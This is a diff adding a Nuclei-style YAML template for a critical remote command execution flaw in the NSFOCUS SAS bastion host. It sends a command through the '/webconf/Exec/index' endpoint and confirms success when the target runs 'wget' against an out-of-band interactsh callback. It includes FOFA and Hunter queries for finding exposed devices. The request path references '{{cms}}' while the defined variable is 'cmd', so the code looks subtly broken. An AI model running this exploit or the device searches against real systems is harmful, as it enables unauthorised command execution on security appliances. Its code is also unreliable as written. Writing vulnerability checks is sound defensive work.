@@ -1,0 +1,28 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - contains(interactsh_protocol, "dns")
+          type: dsl
+      method: GET
+      path:
+        - '{{BaseURL}}/webconf/Exec/index?cms={{cms}}'
+id: 绿盟-sas-rce-exec
+info:
+    author: hufei
+    description: |
+        绿盟 SAS堡垒机Exec 远程命令执行漏洞
+    metadata:
+        fofa-query: title=="NSFOCUS&nbsp;SAS[H]"
+        hunter-query: app.name="NSFOCUS 绿盟 SAS"
+        max-request: 3
+        verified: true
+    name: 绿盟-sas-rce-exec
+    reference: https://mp.weixin.qq.com/s/qHPo0noFTvJoEcor00qtDg
+    severity: critical
+    tags:
+        - HVV
+        - 绿盟-sas
+variables:
+    cmd: wget {{dns}}
+    dns: '{{interactsh-url}}'
